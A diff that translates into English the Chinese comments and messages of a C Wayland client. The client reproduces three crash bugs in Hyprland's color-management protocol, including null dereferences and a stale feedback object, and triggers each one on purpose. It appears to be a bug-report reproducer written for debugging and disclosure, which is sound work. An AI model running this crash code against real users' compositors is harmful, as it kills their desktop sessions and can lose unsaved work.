@@ -9,16 +9,16 @@
 #include "xdg-shell-client-protocol.h"
 
 /*
- * 复现客户端 — Hyprland wp_color_management v1（cm/tonemap-ref-scaling @30e438818）
+ * Reproduction client for Hyprland wp_color_management v1 (cm/tonemap-ref-scaling @30e438818)
  *
- * 用法：
- *   ./repro feedback            触发崩溃 #1（feedback 未随 surface 销毁转 inert）
- *   ./repro getinfo VICTIM      触发崩溃 #2A（failed 描述对象上 get_information）
- *   ./repro poison  VICTIM      触发崩溃 #2B（failed 描述经 set_image_description 进渲染循环）
+ * Usage:
+ *   ./repro feedback            trigger crash #1 (feedback not inerted when its surface dies)
+ *   ./repro getinfo VICTIM      trigger crash #2A (get_information on a failed description)
+ *   ./repro poison  VICTIM      trigger crash #2B (failed description entering the render loop via set_image_description)
  *
- * 前提：render:cm_enabled=1（该分支默认开）；getinfo/poison 前先
+ * Prereq: render:cm_enabled=1 (default-on in this branch); for getinfo/poison first run
  *   hyprctl output create headless VICTIM
- * 程序会停在“按回车”处，等你在另一个终端执行触发命令（destroy 输出 / 改 monitor 规则）。
+ * The program pauses at 'press Enter' while you run the trigger command in another terminal (destroy the output / change a monitor rule).
  */
 
 static struct wl_display *dpy;
@@ -56,13 +56,13 @@ static const struct wl_output_listener out_li = {
 static void d_failed(void *d, struct wp_image_description_v1 *o, uint32_t cause, const char *msg) {
     (void)d; (void)o;
     got_failed = 1; fail_cause = cause;
-    printf("[*] failed(cause=%u, \"%s\") — 按规范此对象只能销毁\n", cause, msg);
+    printf("[*] failed(cause=%u, \"%s\") — per spec this object may only be destroyed\n", cause, msg);
     fflush(stdout);
 }
 static void d_ready(void *d, struct wp_image_description_v1 *o, uint32_t id) {
     (void)d; (void)o;
     got_ready = 1;
-    printf("[?] ready(id=%u) — 输出还活着？请先 hyprctl output destroy\n", id);
+    printf("[?] ready(id=%u) — output still alive? destroy it first via hyprctl output destroy\n", id);
     fflush(stdout);
 }
 static void d_ready2(void *d, struct wp_image_description_v1 *o, uint32_t hi, uint32_t lo) {
@@ -121,7 +121,7 @@ static struct wl_buffer *make_buffer(void) {
 }
 
 static void press_enter(const char *hint) {
-    printf("[*] %s\n[*] 完成后按回车…\n", hint);
+    printf("[*] %s\n[*] press Enter when done…\n", hint);
     fflush(stdout);
     getchar();
 }
@@ -132,7 +132,7 @@ int main(int argc, char **argv) {
         want_output = argv[2];
 
     if (!(dpy = wl_display_connect(NULL))) {
-        fprintf(stderr, "无法连接 Wayland 显示\n");
+        fprintf(stderr, "cannot connect to Wayland display\n");
         return 2;
     }
     struct wl_registry *r = wl_display_get_registry(dpy);
@@ -140,7 +140,7 @@ int main(int argc, char **argv) {
     wl_display_roundtrip(dpy);
     wl_display_roundtrip(dpy);
     if (!cmgr) {
-        fprintf(stderr, "wp_color_manager_v1 未通告（render:cm_enabled 是否为 1？）\n");
+        fprintf(stderr, "wp_color_manager_v1 not advertised (is render:cm_enabled=1?)\n");
         return 2;
     }
 
@@ -150,38 +150,38 @@ int main(int argc, char **argv) {
             wp_color_manager_v1_get_surface_feedback(cmgr, s);
         (void)fb;
         wl_display_roundtrip(dpy);
-        wl_surface_destroy(s); /* surface 死了，feedback 按规范应变 inert——实现里没有 */
-        printf("[*] surface 已销毁，feedback 仍留在服务端列表里\n");
-        press_enter("另一个终端执行（任一即可，只要让输出图像描述变化）：\n"
-                    "    hyprctl keyword monitor <输出名>,add,cm,hdr\n"
-                    "    hyprctl keyword monitor <输出名>,add,sdr_max_luminance,300");
-        printf("[*] 等待无守卫广播崩溃（ColorManagement.cpp:460）…\n");
+        wl_surface_destroy(s); /* surface dies; spec says feedback must become inert — implementation never does */
+        printf("[*] surface destroyed; feedback still parked in the server-side list\n");
+        press_enter("In another terminal run either of these (any change to the output image description works):\n"
+                    "    hyprctl keyword monitor <output-name>,add,cm,hdr\n"
+                    "    hyprctl keyword monitor <output-name>,add,sdr_max_luminance,300");
+        printf("[*] waiting for the unguarded broadcast crash (ColorManagement.cpp:460)…\n");
         fflush(stdout);
         while (wl_display_dispatch(dpy) != -1)
             ;
-        printf("[!] 连接断开 → 确认 hyprland 是否以 SIGSEGV 死亡\n");
+        printf("[!] connection dropped — verify hyprland died with SIGSEGV\n");
         return 0;
     }
 
     if (!strcmp(mode, "getinfo") || !strcmp(mode, "poison")) {
         if (!victim) {
-            fprintf(stderr, "找不到名为 %s 的输出（hyprctl monitors 确认名字）\n", want_output);
+            fprintf(stderr, "output '%s' not found (check names via hyprctl monitors)\n", want_output);
             return 2;
         }
         struct wp_color_management_output_v1 *cmout = wp_color_manager_v1_get_output(cmgr, victim);
         wl_display_roundtrip(dpy);
-        press_enter("另一个终端执行：\n    hyprctl output destroy VICTIM名字");
+        press_enter("In another terminal run:\n    hyprctl output destroy <VICTIM-name>");
         struct wp_image_description_v1 *desc = wp_color_management_output_v1_get_image_description(cmout);
         wp_image_description_v1_add_listener(desc, &d_li, NULL);
         while (!got_failed && !got_ready && wl_display_dispatch(dpy) != -1)
             ;
         if (got_ready) {
-            fprintf(stderr, "没拿到 failed，无法继续（输出没被销毁？）\n");
+            fprintf(stderr, "no failed event received, aborting (was the output actually destroyed?)\n");
             return 2;
         }
 
         if (!strcmp(mode, "getinfo")) {
-            printf("[*] 向 failed 对象发 get_information（ColorManagement.cpp:767 空 WP 解引用）…\n");
+            printf("[*] sending get_information on the failed object (null WP deref at ColorManagement.cpp:767)…\n");
             fflush(stdout);
             struct wp_image_description_info_v1 *info = wp_image_description_v1_get_information(desc);
             static const struct wp_image_description_info_v1_listener nulli;
@@ -200,20 +200,20 @@ int main(int argc, char **argv) {
 
             struct wp_color_management_surface_v1 *cms = wp_color_manager_v1_get_surface(cmgr, s);
             wp_color_management_surface_v1_set_image_description(cms, desc,
-                WP_COLOR_MANAGER_V1_RENDER_INTENT_PERCEPTUAL); /* :323-324 拷入空 WP */
+                WP_COLOR_MANAGER_V1_RENDER_INTENT_PERCEPTUAL); /* :323-324 copies the empty WP in */
             xdg_toplevel_set_fullscreen(tl, NULL);
             wl_surface_attach(s, make_buffer(), 0, 0);
             wl_surface_damage(s, 0, 0, 16, 16);
             wl_surface_commit(s);
-            printf("[*] 已提交带 failed 描述的全屏窗口，等渲染线程崩（Renderer.cpp:2571 → isHDR）…\n");
+            printf("[*] fullscreen window committed with the failed description; waiting for the render-thread crash (Renderer.cpp:2571 -> isHDR)…\n");
             fflush(stdout);
             while (wl_display_dispatch(dpy) != -1)
                 ;
         }
-        printf("[!] 连接断开 → 确认 hyprland 是否死亡\n");
+        printf("[!] connection dropped — verify hyprland died\n");
         return 0;
     }
 
-    fprintf(stderr, "用法: %s feedback | getinfo VICTIM | poison VICTIM\n", argv[0]);
+    fprintf(stderr, "usage: %s feedback | getinfo VICTIM | poison VICTIM\n", argv[0]);
     return 1;
 }
